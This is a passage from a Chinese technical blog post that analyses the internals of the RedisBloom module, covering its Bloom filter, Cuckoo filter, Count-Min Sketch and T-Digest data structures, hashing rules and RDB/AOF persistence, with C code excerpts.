        <content type="html"><![CDATA[<p>RedisBloom 这个 Module 内集成了很多的小功能，其中主要包括：可扩展的布隆过滤器（BloomFilter），可扩展的布谷鸟过滤器（CuckooFilter），最小计数草图（Count-Min Sketch），近似百分位（T-Digest），头部K元素（TopK）等。</p><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p><code>RedisBloom</code> 是一款集成了众多功能的 <code>RedisModule</code> 模块，其主要包含了 <code>BloomFilter (布隆过滤器)</code> ，<code>CuckooFilter (布谷鸟过滤器)</code>，<code>Count-Min Sketch (最小计数草图)</code>，<code>T-Digest (近似百分位)</code> 以及 <code>TopK</code> 功能，其中很多功能都是依据 <code>BloomFilter类</code> 的相关功能来进行实现的，这里将会对它们的具体实现做一下深度的剖析。</p><ul><li>官网：<a href="https://redisbloom.io/">https://redisbloom.io/</a></li><li>GitHub 地址：<a href="https://github.com/RedisBloom/RedisBloom">https://github.com/RedisBloom/RedisBloom</a></li><li>命令文档地址：<a href="https://redis.io/docs/stack/bloom/">https://redis.io/docs/stack/bloom/</a></li><li>支持功能：<ul><li><a href="https://redis.io/commands/bf.add/">可扩展的 BloomFilter (布隆过滤器) </a>： 用于确定一个元素是否存在于一个集群中；</li><li><a href="https://redis.io/commands/cf.add/">可扩展的 CuckooFilter (布谷鸟过滤器)</a> ： 用于确定一个元素是否存在于一个集合中；</li><li><a href="https://redis.io/commands/cms.incrby/">Count-Min Sketch (最小计数草图)</a> ： 用于估计一个数据的出现次数；</li><li><a href="https://redis.io/commands/tdigest.add/">T-Digest</a> (近似百分位) ：</li><li><a href="https://redis.io/commands/topk.add/">TopK</a> ： 维护了 k 个最常见项目的列表；</li></ul></li></ul><h2 id="二、可扩展的-BloomFilter-布隆过滤器"><a href="#二、可扩展的-BloomFilter-布隆过滤器" class="headerlink" title="二、可扩展的 BloomFilter (布隆过滤器)"></a>二、可扩展的 BloomFilter (布隆过滤器)</h2><p>社区在实现可扩展的 BloomFilter 的时候应该参考了论文： <a href="https://haslab.uminho.pt/cbm/files/dbloom.pdf?spm=a2c4g.11186623.0.0.5a5d7e53oDkkj8&file=dbloom.pdf">《Scalable Bloom Filters》</a> ，这篇论文的翻译稿： </p><p>RedisBloom 通过将单个的数据表分散到多个数据表中，从而实现了一种可扩展数据表的布隆过滤器，虽然这种方式使用较为灵活，不受限于初始容量的约束，但是动态的申请多个子布隆过滤器会导致内存的增长比较严重，要这种方式就要在灵活以及内存间做一些取舍。</p><h3 id="2-1、相关命令"><a href="#2-1、相关命令" class="headerlink" title="2.1、相关命令"></a>2.1、相关命令</h3><p>以下命令仅参考当时的最新的代码，详细的准确命令请参考 <a href="https://redis.io/commands/bf.add/">社区命令文档地址</a> 。</p><ul><li>bf.add : 向目标布隆过滤器中添加一个元素；</li><li>bf.madd : 向目标布隆过滤器中添加多个元素；</li><li>bf.exists : 在目标布隆过滤器中判断一个元素是否存在；</li><li>bf.mexists : 在目标布隆过滤器中判断多个元素是否存在；</li><li>bf.info : 查看对应布隆过滤器的基础信息；</li><li>bf.debug : 查看对应布隆过滤器的详细信息（包含每个布隆过滤器表的信息）；</li><li>bf.insert : 向目标布隆过滤器中插入元素，如果对应布隆过滤器不存在则创建；</li><li>bf.reserve : 修改目标布隆过滤器的属性；</li><li>bf.loadchunk : 布隆过滤器从 AOF 中加载数据时用到的命令；</li><li>bf.scandump : 布隆过滤器向 AOF 中持久化数据时用到的命令；</li></ul><h3 id="2-2、编码结构"><a href="#2-2、编码结构" class="headerlink" title="2.2、编码结构"></a>2.2、编码结构</h3><p>一个可扩展的布隆过滤器所依赖的主要数据结构如下所示：</p><figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">SBChain</span> &#123;<br>    SBLink *filters;  <span class="hljs-comment">// 记录所有的布隆过滤器</span><br>    <span class="hljs-type">size_t</span> size;      <span class="hljs-comment">// 记录当前所有布隆过滤器可存储元素的数量</span><br>    <span class="hljs-type">size_t</span> nfilters;  <span class="hljs-comment">// 记录当前布隆过滤器数据的个数</span><br>    <span class="hljs-type">unsigned</span> options; <span class="hljs-comment">// 创建布隆过滤器表所依赖的参数</span><br>    <span class="hljs-type">unsigned</span> growth;  <span class="hljs-comment">// 创建新的布隆过滤器时其容量是上一个布隆过滤器的容量倍数</span><br>&#125; SBChain;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">SBLink</span> &#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">bloom</span> inner; <span class="hljs-comment">// 对应的布隆过滤器</span><br>    <span class="hljs-type">size_t</span> size;        <span class="hljs-comment">// 已插入布隆过滤器表中的元素的个数</span><br>&#125; SBLink;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">bloom</span> &#123;<br>    <span class="hljs-type">uint32_t</span> hashes;   <span class="hljs-comment">// 记录当前的hash数量</span><br>    <span class="hljs-type">uint8_t</span> force64;<br>    <span class="hljs-type">uint8_t</span> n2;<br>    <span class="hljs-type">uint64_t</span> entries;  <span class="hljs-comment">// 记录当前布隆过滤器的容量</span><br><br>    <span class="hljs-type">double</span> error;      <span class="hljs-comment">// 记录当前布隆过滤器的误判率</span><br>    <span class="hljs-type">double</span> bpe;<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *bf; <span class="hljs-comment">// 指向布隆过滤器存储内容的内存块</span><br>    <span class="hljs-type">uint64_t</span> bytes;    <span class="hljs-comment">// 记录布隆过滤器存储内容的内存块的大小（字节）</span><br>    <span class="hljs-type">uint64_t</span> bits;     <span class="hljs-comment">// 记录布隆过滤器存储内容的内存块的大小（比特）</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="/assets/images/redismodule-redisbloom-bloomfilter.png" alt="BloomFilter 存储结构" loading="lazy"></p><h3 id="2-3、哈希规则（插入-判断规则）"><a href="#2-3、哈希规则（插入-判断规则）" class="headerlink" title="2.3、哈希规则（插入&#x2F;判断规则）"></a>2.3、哈希规则（插入&#x2F;判断规则）</h3><p>按照布隆过滤器的计算规则，在不同的误判率的情况下我们需要使用多个不同的哈希函数计算对应的比特位，我们接下来看一下布隆过滤器的判断&#x2F;插入规则：</p><ul><li>哈希算法： <code>MurmurHash64A</code></li><li>判断方式：<ul><li>首先使用固定的哈希种子，对传入的元素计算其哈希值，并将其作为基础的哈希值；</li><li>然后使用传入元素的哈希值作为哈希种子，计算下一次哈希位置的步进值；</li><li>利用得到的传入元素的哈希特征，在多个布隆过滤器中进行判断元素是否存在；<ul><li>判断基础的哈希值对应的比特索引；</li><li>利用计算的步进值，判断下一个对应的比特索引；</li></ul></li></ul></li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 计算传入元素的哈希特征</span><br><span class="hljs-function">bloom_hashval <span class="hljs-title">bloom_calc_hash64</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *buffer, <span class="hljs-type">int</span> len)</span> </span>&#123;<br>    bloom_hashval rv;<br>    rv.a = <span class="hljs-built_in">MurmurHash64A_Bloom</span>(buffer, len, <span class="hljs-number">0xc6a4a7935bd1e995ULL</span>);<br>    rv.b = <span class="hljs-built_in">MurmurHash64A_Bloom</span>(buffer, len, rv.a);<br>    <span class="hljs-keyword">return</span> rv;<br>&#125;<br><br><span class="hljs-comment">// 判断多个布隆过滤器中的对应比特位</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> ii = sb-&gt;nfilters - <span class="hljs-number">1</span>; ii &gt;= <span class="hljs-number">0</span>; --ii) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">bloom_check_h</span>(&amp;sb-&gt;filters[ii].inner, h)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-4、持久化"><a href="#2-4、持久化" class="headerlink" title="2.4、持久化"></a>2.4、持久化</h3><h4 id="2-4-1、RDB的持久化"><a href="#2-4-1、RDB的持久化" class="headerlink" title="2.4.1、RDB的持久化"></a>2.4.1、RDB的持久化</h4><p>RDB 的存储过程比较简单，直接把对应结构体的所有信息持久化到 RDB 文件中，一个可扩展的布隆过滤器的存储流程如下：</p><ul><li>存储对应的所有子布隆过滤器的元信息（包括子布隆过滤器的数量，配置项等）；</li><li>存储每个子布隆过滤器的信息：<ul><li>子布隆过滤器的元信息（包括元素数量，误判率，哈希数量等）；</li><li>子布隆过滤器的数据信息；</li></ul></li></ul><h4 id="2-4-2、AOF的持久化"><a href="#2-4-2、AOF的持久化" class="headerlink" title="2.4.2、AOF的持久化"></a>2.4.2、AOF的持久化</h4><p>数据 AOF 的持久化会在 AofRewrite 的时候时用到，因为需要封装一下命令以便于下一次的加载 <code>bf.loadchunk</code>，一个可扩展的布隆过滤器的存储流程如下：</p><ul><li>首先存储对应布隆过滤器的元信息（包括布隆过滤器的数量，配置项，以及子布隆过滤器的元素数量，误判率，哈希数量等）；<ul><li>存储命令简化为：<code>BF.LOADCHUNK key 1 meta_data meta_len</code> ；</li></ul></li><li>然后存储所有子布隆过滤器的数据信息，默认单次存储的数据信息大小最大为 16MB，以下命令会持久化多次；<ul><li>存储命令简化为：<code>BF.LOADCHUNK key iter body_data body_len</code> ；</li></ul></li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">BFAofRewrite</span><span class="hljs-params">(RedisModuleIO *aof, RedisModuleString *key, <span class="hljs-type">void</span> *value)</span> </span>&#123;<br>    SBChain *sb = value;<br>    <span class="hljs-type">size_t</span> len;<br>    <span class="hljs-type">char</span> *hdr = <span class="hljs-built_in">SBChain_GetEncodedHeader</span>(sb, &amp;len);<br>    <span class="hljs-built_in">RedisModule_EmitAOF</span>(aof, <span class="hljs-string">&quot;BF.LOADCHUNK&quot;</span>, <span class="hljs-string">&quot;slb&quot;</span>, key, <span class="hljs-number">1</span>, hdr, len);<br>    <span class="hljs-built_in">SB_FreeEncodedHeader</span>(hdr);<br><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> iter = SB_CHUNKITER_INIT;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *chunk;<br>    <span class="hljs-keyword">while</span> ((chunk = <span class="hljs-built_in">SBChain_GetEncodedChunk</span>(sb, &amp;iter, &amp;len, MAX_SCANDUMP_SIZE)) != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">RedisModule_EmitAOF</span>(aof, <span class="hljs-string">&quot;BF.LOADCHUNK&quot;</span>, <span class="hljs-string">&quot;slb&quot;</span>, key, iter, chunk, len);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="三、可扩展的-CuckooFilter-布谷鸟过滤器"><a href="#三、可扩展的-CuckooFilter-布谷鸟过滤器" class="headerlink" title="三、可扩展的 CuckooFilter (布谷鸟过滤器)"></a>三、可扩展的 CuckooFilter (布谷鸟过滤器)</h2><p>布谷鸟过滤器在某些场景下能够比布隆过滤器提供更好的填充率，并且支持了删除元素，在某些场景下也为很多业务提供了更好的支持。</p><h3 id="3-1、相关命令"><a href="#3-1、相关命令" class="headerlink" title="3.1、相关命令"></a>3.1、相关命令</h3><p>以下命令仅参考当时的最新的代码，详细的准确命令请参考 <a href="https://redis.io/commands/cf.add/">社区命令文档地址</a> 。</p><ul><li>cf.add : 向目标布谷鸟过滤器中添加一个元素；</li><li>cf.addnx : 向目标布谷鸟过滤器中添加一个元素，只有当元素不存在时才会添加成功；</li><li>cf.count : 计算在目标布谷鸟过滤器中对应元素的个数，由于是计算对应元素的指纹的存在个数，因此最终结果可能不准确；</li><li>cf.del : 从布谷鸟过滤器中删除一个元素，删除的是元素的指纹，并且只删除一次；</li><li>cf.exists : 判断布谷鸟过滤器中对应元素是否存在；</li><li>cf.mexists : 判断布谷鸟过滤器中多个元素是否存在；</li><li>cf.info : 获取布谷鸟过滤器的信息；</li><li>cf.insert : 向布谷鸟过滤器中插入一个元素，如果布谷鸟过滤器不存在则创建；</li><li>cf.insertnx : 向布谷鸟过滤器中插入一个元素，如果布谷鸟过滤器不存在则创建，如果对应元素已经存在则不会插入成功；</li><li>cf.reserve : 修改对应布谷鸟过滤器的属性；</li><li>cf.loadchunk : 持久化的相关命令；</li><li>cf.scandump : 持久化的相关命令；</li></ul><h3 id="3-2、编码结构"><a href="#3-2、编码结构" class="headerlink" title="3.2、编码结构"></a>3.2、编码结构</h3><p>一个可扩展的布谷鸟过滤器所依赖的主要数据结构如下所示：</p><figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-type">uint64_t</span> numBuckets;     <span class="hljs-comment">// bucket 的数量，大小为2次幂的值</span><br>    <span class="hljs-type">uint64_t</span> numItems;       <span class="hljs-comment">// 插入元素的数量</span><br>    <span class="hljs-type">uint64_t</span> numDeletes;     <span class="hljs-comment">// 删除元素的数量</span><br>    <span class="hljs-type">uint16_t</span> numFilters;     <span class="hljs-comment">// 所有子布谷鸟过滤器的数量</span><br>    <span class="hljs-type">uint16_t</span> bucketSize;     <span class="hljs-comment">// 每个 bucket 中可以存储指纹的数量，默认为2</span><br>    <span class="hljs-type">uint16_t</span> maxIterations;  <span class="hljs-comment">// 寻找指纹的存储空间时的最大迭代次数，默认为20次</span><br>    <span class="hljs-type">uint16_t</span> expansion;      <span class="hljs-comment">// 扩展倍数，大小为2次幂的值，默认为2</span><br>    SubCF *filters;          <span class="hljs-comment">// 所有子布谷鸟过滤器信息的数组</span><br>&#125; CuckooFilter;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-type">uint32_t</span> numBuckets;     <span class="hljs-comment">// bucket 的数量，大小为2次幂的值</span><br>    <span class="hljs-type">uint8_t</span> bucketSize;      <span class="hljs-comment">// 每个 bucket 中可以存储指纹的数量</span><br>    <span class="hljs-type">uint8_t</span> *data;           <span class="hljs-comment">// 实际存储数据的内存块指针</span><br>&#125; SubCF;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-type">uint64_t</span> i1;             <span class="hljs-comment">// 记录元素的一个哈希值</span><br>    <span class="hljs-type">uint64_t</span> i2;             <span class="hljs-comment">// 记录元素的另一个哈希值</span><br>    <span class="hljs-type">uint8_t</span> fp;              <span class="hljs-comment">// 指纹的大小是1到255</span><br>&#125; CuckooKey;<br><br></code></pre></td></tr></table></figure><h3 id="3-3、哈希规则（插入-判断规则）"><a href="#3-3、哈希规则（插入-判断规则）" class="headerlink" title="3.3、哈希规则（插入&#x2F;判断规则）"></a>3.3、哈希规则（插入&#x2F;判断规则）</h3><p>按照布谷鸟过滤器的计算规则，当我们需要判断一个元素是否存在的时候需要判断两个位置上的空间中是否存在特定的指纹信息；当需要进行插入操作的时候需要从两个索引的位置上随机找到一个空余的空间进行插入操作，因此针对于每一个传入的元素，我们都会生成两个对应的特征值。</p><ul><li>哈希算法： <code>MurmurHash64A</code></li><li>判断方式：<ul><li>依据传入的元素，利用哈希算法 <code>MurmurHash64A</code> 计算其哈希值；</li><li>利用哈希值计算对应传入元素的指纹信息(<code>fp</code>)，以及对应的两个哈希特征值(<code>h1</code> 和 <code>h2</code>)；</li><li>依次判断多个子布谷鸟过滤器中是否有足够的空间来存储新的元素；<ul><li>每次都使用传入元素的两个哈希特征值（<code>h1</code> 和 <code>h2</code>）判断在对应的 bucket 的数组中是否存在空位置：<ul><li>如果有空位置则将对应的元素指纹插入对应空位；</li><li>如果没有空位置则尝试进行踢除操作；</li></ul></li></ul></li><li>插入元素或者判断元素是否存在结束；</li></ul></li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 传入元素的特征信息</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-type">uint64_t</span> h1;<br>    <span class="hljs-type">uint64_t</span> h2;<br>    <span class="hljs-type">uint8_t</span> fp;<br>&#125; LookupParams;<br><br><span class="hljs-comment">// 依据其中的一个位置来计算另一个的位置</span><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span> <span class="hljs-title">getAltHash</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> fp, <span class="hljs-type">uint64_t</span> index)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> ((<span class="hljs-type">uint64_t</span>)(index ^ ((<span class="hljs-type">uint64_t</span>)fp * <span class="hljs-number">0x5bd1e995</span>)));<br>&#125;<br><br><span class="hljs-comment">// 计算对应哈希值的指纹以及对应的两个位置</span><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">getLookupParams</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> hash, LookupParams *params)</span> </span>&#123;<br>    params-&gt;fp = hash % <span class="hljs-number">255</span> + <span class="hljs-number">1</span>;<br>    params-&gt;h1 = hash;<br>    params-&gt;h2 = <span class="hljs-built_in">getAltHash</span>(params-&gt;fp, params-&gt;h1);<br>&#125;<br><br><span class="hljs-type">uint64_t</span> hash = <span class="hljs-built_in">MurmurHash64A_Bloom</span>(elem, elemlen);<br>LookupParams params;<br><span class="hljs-built_in">getLookupParams</span>(hash, &amp;params);<br></code></pre></td></tr></table></figure><h3 id="3-4、踢除规则"><a href="#3-4、踢除规则" class="headerlink" title="3.4、踢除规则"></a>3.4、踢除规则</h3><p>由于不同传入值的指纹可能相同，同一个 bucket 的空间可能会被其他相同指纹的传入值占满，导致新的值无法插入，这时就需要对已有空间中的值进行踢除操作。</p><ul><li>相关函数：<code>Filter_KOInsert</code></li><li>具体流程：<ol><li>将从最新的布谷鸟过滤器中执行踢除操作；</li><li>依据传入值的其中一个哈希值，找到对应的 bucket 的位置，获取其中特定位置中的指纹信息，然后将新的指纹存储到特定位置上；</li><li>寻找上次获取到的 bucket 中的老的指纹的下一个位置点，判断对应的 bucket 中是否有空闲位置：<ol><li>如果有空闲位置，则将之前替换出的指纹存到新 bucket 的空闲位置中；</li><li>如果没有空闲位置，则再次进行寻找，再次从第2步开始；</li></ol></li></ol></li></ul><h3 id="3-5、持久化"><a href="#3-5、持久化" class="headerlink" title="3.5、持久化"></a>3.5、持久化</h3><h4 id="3-5-1、RDB的持久化"><a href="#3-5-1、RDB的持久化" class="headerlink" title="3.5.1、RDB的持久化"></a>3.5.1、RDB的持久化</h4><p>RDB 的存储过程比较简单，直接把对应结构体的所有信息持久化到 RDB 文件中，一个可扩展的布谷鸟过滤器的存储流程如下：</p><ul><li>存储对应的所有子布谷鸟过滤器的元信息（包括子布谷鸟过滤器的数量，配置项等）；</li><li>存储每个子布谷鸟过滤器的信息：<ul><li>子布谷鸟过滤器的元信息（包括 bucket 数量等）；</li><li>子布谷鸟过滤器的数据信息；</li></ul></li></ul><h4 id="3-5-2、AOF的持久化"><a href="#3-5-2、AOF的持久化" class="headerlink" title="3.5.2、AOF的持久化"></a>3.5.2、AOF的持久化</h4><p>数据 AOF 的持久化会在 AofRewrite 的时候时用到，因为需要封装一下命令以便于下一次的加载 <code>cf.loadchunk</code>，一个可扩展的布谷鸟过滤器的存储流程如下：</p><ul><li>首先存储对应布谷鸟过滤器的元信息（包括布谷鸟过滤器的数量，配置项，以及子布谷鸟过滤器的 bucket 数量等）；<ul><li>存储命令简化为：<code>CF.LOADCHUNK key 1 meta_data meta_len</code> ；</li></ul></li><li>然后存储所有子布谷鸟过滤器的数据信息，默认单次存储的数据信息大小最大为 16MB，以下命令会持久化多次；<ul><li>存储命令简化为：<code>CF.LOADCHUNK key iter body_data body_len</code> ；</li></ul></li></ul><h2 id="四、Count-Min-Sketch-最小计数草图"><a href="#四、Count-Min-Sketch-最小计数草图" class="headerlink" title="四、Count-Min Sketch (最小计数草图)"></a>四、Count-Min Sketch (最小计数草图)</h2><p>Count-Min Sketch (最小计数草图) 的实现思路类似于 <code>Counting-BloomFilter (计数布隆过滤器)</code> , 插入的过程中，使用多个哈希函数使得对应元素在对应位置上的值（范围是<code>uint32_t</code>）加1；查询的过程中，使用多个哈希函数获取对应元素在对应位置上的值（范围是<code>uint32_t</code>），并返回最小值（将其作为这个元素的操作次数），因此最终的值有可能会大于实际的操作值，<code>Count-Min Sketch</code> 的名字也是这么来的。</p><h3 id="4-1、相关命令"><a href="#4-1、相关命令" class="headerlink" title="4.1、相关命令"></a>4.1、相关命令</h3><p>以下命令仅参考当时的最新的代码，详细的准确命令请参考 <a href="https://redis.io/commands/cms.incrby/">社区命令文档地址</a> 。</p><ul><li>cms.incrby : 按增量增加对应元素的计数值，支持多元素增加计算；</li><li>cms.info : 获取对应草图的宽度、深度和总数；</li><li>cms.initbydim : 根据指定的 <code>width</code> 和 <code>depth</code> 来初始化 <code>Count-Min Sketch</code>；<ul><li>格式 : <code>cms.initbydim key width depth</code></li><li>解释 : <ul><li><code>key</code> : 草图的名称；</li><li><code>width</code> : 每个数组中计数器的数量，如果该值较小，则误判的概率较大；</li><li><code>depth</code> : 每次需要比较的数组的数量（计数器阵列的数量），减少特定大小错误的概率（占总数的百分比）；</li></ul></li></ul></li><li>cms.initbyprob : 根据错误率计算得到对应的 <code>width</code> 和 <code>depth</code> 来初始化 <code>Count-Min Sketch</code>；<ul><li>格式 : <code>cms.initbyprob key error probability</code></li><li>解释 : <ul><li><code>key</code> : 草图的名称；</li><li><code>error</code> : 预估错误的值，这应该是介于 <code>0</code> 和 <code>1</code> 之间的十进制值，错误是总计数项目的百分比，影响草图的宽度；</li><li><code>probability</code> : 膨胀计数的期望概率，这应该是介于 <code>0</code> 和 <code>1</code> 之间的十进制值（例如 <code>0.001</code>），影响草图的深度；</li></ul></li><li>计算规则 :<ul><li>相关函数 : <code>CMS_DimFromProb</code> ；</li><li><code>width</code> 值 : <code>ceil(2 / error)</code> ；</li><li><code>depth</code> 值 : <code>ceil(log10f(probability) / log10f(0.5))</code>；</li></ul></li></ul></li><li>cms.merge : 将多个草图合并为一个草图。所有草图必须具有相同的宽度和深度，支持设置合并的权重；</li><li>cms.query : 返回草图中一个或多个项目的计数；</li></ul><h3 id="4-2、编码结构"><a href="#4-2、编码结构" class="headerlink" title="4.2、编码结构"></a>4.2、编码结构</h3><figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 最小计数草图的数据结构</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">CMS</span> &#123;<br>    <span class="hljs-type">size_t</span> width;         <span class="hljs-comment">// 每个数组中的计数器数，用于减小错误大小</span><br>    <span class="hljs-type">size_t</span> depth;         <span class="hljs-comment">// 计数器阵列的数量</span><br>    <span class="hljs-type">uint32_t</span> *array;      <span class="hljs-comment">// 数组指针</span><br>    <span class="hljs-type">size_t</span> counter;       <span class="hljs-comment">// 当前最小计数草图中所有元素的计数和</span><br>&#125; CMSketch;<br></code></pre></td></tr></table></figure><h3 id="4-3、哈希规则"><a href="#4-3、哈希规则" class="headerlink" title="4.3、哈希规则"></a>4.3、哈希规则</h3><ul><li>哈希算法： <code>MurmurHash2</code> ；</li><li>具体流程：<ul><li>每一个最小计数草图都有一个深度的值，依据该深度值依次查询对应深度的对应索引上的值；</li><li>根据当前的深度，设置获取哈希值的种子（从 <code>0</code> 到 <code>当前最小计数草图的深度</code>），然后得到对应的哈希值；</li><li>依据哈希值得到当前深度下的对应位置上的值；</li><li>获取或者变更对应位置上的值；</li></ul></li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; cms-&gt;depth; ++i) &#123;<br>    <span class="hljs-type">uint32_t</span> hash = <span class="hljs-built_in">MurmurHash2</span>(item, itemlen, i);<br>    <span class="hljs-type">size_t</span> loc = (hash % cms-&gt;width) + (i * cms-&gt;width);<br>    cms-&gt;array[loc] += value;<br>    <span class="hljs-keyword">if</span> (cms-&gt;array[loc] &lt; value) &#123;<br>        cms-&gt;array[loc] = UINT32_MAX;<br>    &#125;<br><br>    <span class="hljs-comment">// ...</span><br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-4、持久化"><a href="#4-4、持久化" class="headerlink" title="4.4、持久化"></a>4.4、持久化</h3><h4 id="4-4-1、RDB的持久化"><a href="#4-4-1、RDB的持久化" class="headerlink" title="4.4.1、RDB的持久化"></a>4.4.1、RDB的持久化</h4><p>RDB 的存储过程比较简单，直接把对应结构体的所有信息持久化到 RDB 文件中，一个最小计数草图的存储流程如下：</p><ul><li>存储对应的最小计数草图的元信息（包括深度，宽度，当前计数和等）；</li><li>存储对应的最小计数草图的数据信息（即对应结构体中的 <code>array</code> 指针指向的内存块信息）；</li></ul><h4 id="4-4-2、AOF的持久化"><a href="#4-4-2、AOF的持久化" class="headerlink" title="4.4.2、AOF的持久化"></a>4.4.2、AOF的持久化</h4><p>AOF 的存储过程没有使用自定义的命令，而直接使用了 <code>RESTORE</code> 命令进行持久化：</p><ul><li>相关函数：<code>RMUtil_DefaultAofRewrite</code>；</li><li>具体格式：<code>RESTORE key 0 buffer buffer_len</code> ；</li></ul><h2 id="五、T-Digest-近似百分位"><a href="#五、T-Digest-近似百分位" class="headerlink" title="五、T-Digest (近似百分位)"></a>五、T-Digest (近似百分位)</h2><p><code>T-Digest</code> 是一个简单、快速、精确度高、可并行化的近似百分位算法，被 ElastichSearch、Spark 和 Kylin 等系统使用。TDigest 主要有两种实现算法，一种是 <code>buffer-and-merge</code> 算法，一种是 <code>AVL树</code> 的聚类算法。RedisBloom 使用的是 <code>buffer-and-merge</code> 算法。</p><h3 id="5-1、相关命令"><a href="#5-1、相关命令" class="headerlink" title="5.1、相关命令"></a>5.1、相关命令</h3><p>以下命令仅参考当时的最新的代码，详细的准确命令请参考 <a href="https://redis.io/commands/tdigest.add/">社区命令文档地址</a> 。</p><ul><li>tdigest.create : 创建一个 <code>T-Digest</code> 草图；</li><li>tdigest.add : 将一个或多个值添加到 <code>T-Digest</code> 草图；</li><li>tdigest.reset : 清空草图并重新初始化它；</li><li>tdigest.merge : 将多个 <code>T-Digest</code> 草图中的数据合并到目标 <code>T-Digest</code> 草图中；</li><li>tdigest.min : 获取草图中最小的值；</li><li>tdigest.max : 获取草图中最大的值；</li><li>tdigest.quantile : 返回一个或多个截止值的估计值，使得添加到此 <code>T-Digest</code> 的观察值的指定分数将小于或等于每个指定的截止值；</li><li>tdigest.cdf : 估计添加的所有观察值中 &lt;&#x3D; 值的比例；</li><li>tdigest.info : 获取 <code>T-Digest</code> 草图的信息；</li><li>tdigest.rank : 检索值的估计等级（草图中小于值的观察数 + 等于值的观察数的一半）；</li><li>tdigest.revrank : 检索值的估计等级（草图中大于值的观察数 + 等于值的观察数的一半）</li><li>tdigest.byrank : 检索具有给定等级的值的估计值；</li><li>tdigest.byrevrank : 使用给定的反向排名检索值的估计；</li><li>tdigest.trimmed_mean : 估计草图中的平均值，不包括低和高截止分位数之外的观察值；</li></ul><h3 id="5-2、编码结构"><a href="#5-2、编码结构" class="headerlink" title="5.2、编码结构"></a>5.2、编码结构</h3><figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// T-Digest 数据结构</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">td_histogram</span> &#123;<br>    <span class="hljs-type">double</span> compression;             <span class="hljs-comment">// 压缩参数，默认值为100 （100 是正常使用的常用值，1000 则是一个非常大的值）</span><br>    <span class="hljs-type">double</span> min;                     <span class="hljs-comment">// 记录插入的最小的值</span><br>    <span class="hljs-type">double</span> max;                     <span class="hljs-comment">// 记录插入的最大的值</span><br>    <span class="hljs-type">int</span> cap;                        <span class="hljs-comment">// 节点的容量</span><br>    <span class="hljs-type">int</span> merged_nodes;               <span class="hljs-comment">// 节点前面的合并节点数量</span><br>    <span class="hljs-type">int</span> unmerged_nodes;             <span class="hljs-comment">// 缓冲节点（已经插入的，但是还没有进行merge的节点）的数量</span><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> total_compressions;   <span class="hljs-comment">// 执行数据压缩的次数</span><br>    <span class="hljs-type">double</span> merged_weight;           <span class="hljs-comment">// 已经merge的节点的权重值</span><br>    <span class="hljs-type">double</span> unmerged_weight;         <span class="hljs-comment">// 缓冲节点（已经插入的，但是还没有进行merge的节点）的权重和</span><br>    <span class="hljs-type">double</span> *nodes_mean;             <span class="hljs-comment">// 记录插入的节点值</span><br>    <span class="hljs-type">double</span> *nodes_weight;           <span class="hljs-comment">// 记录插入的节点的权重值</span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="5-3、数据压缩"><a href="#5-3、数据压缩" class="headerlink" title="5.3、数据压缩"></a>5.3、数据压缩</h3><ul><li>相关函数：<ul><li>判断函数：<code>should_td_compress</code></li><li>执行函数：<code>td_compress</code></li></ul></li><li>压缩逻辑：<ul><li>快速排序等待压缩的节点数组，调用 <code>td_qsort</code> ；</li><li>其他压缩逻辑，详见函数：<code>td_compress</code> ；</li></ul></li></ul><h3 id="5-4、持久化"><a href="#5-4、持久化" class="headerlink" title="5.4、持久化"></a>5.4、持久化</h3><h4 id="5-4-1、RDB的持久化"><a href="#5-4-1、RDB的持久化" class="headerlink" title="5.4.1、RDB的持久化"></a>5.4.1、RDB的持久化</h4><p>RDB 的存储过程比较简单，直接把对应结构体的所有信息持久化到 RDB 文件中，一个 